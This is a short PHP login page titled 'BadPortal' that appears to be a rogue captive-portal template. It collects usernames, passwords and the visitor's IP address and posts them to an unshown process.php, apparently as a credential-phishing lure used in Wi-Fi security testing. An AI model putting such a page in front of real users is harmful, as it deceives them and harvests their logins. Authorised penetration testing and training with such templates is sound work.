<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<html>

  <head>

    <title>Title</title>

    <meta charset='UTF-8'>
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="pragma" content="no-cache" />
    <meta name="viewport" content="width=device-width,
    initial-scale=0.75, maximum-scale=0.75, user-scalable=no">
    <meta name="theme-color" content="#5170ad" />

  </head>

  <body>

    

      <h1 class="badportal">Welcome to BadPortal!!!</h1>

        <form class="login-form" method="POST" action="process.php">

            <center><label><input type="text" name="user" placeholder="Username" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required></label>
            <label><input type="password" name="password" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required></label></center>
          
            
            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
            <br>
            <input type="submit" value="Log In">

        </form>


  </body>

</html>
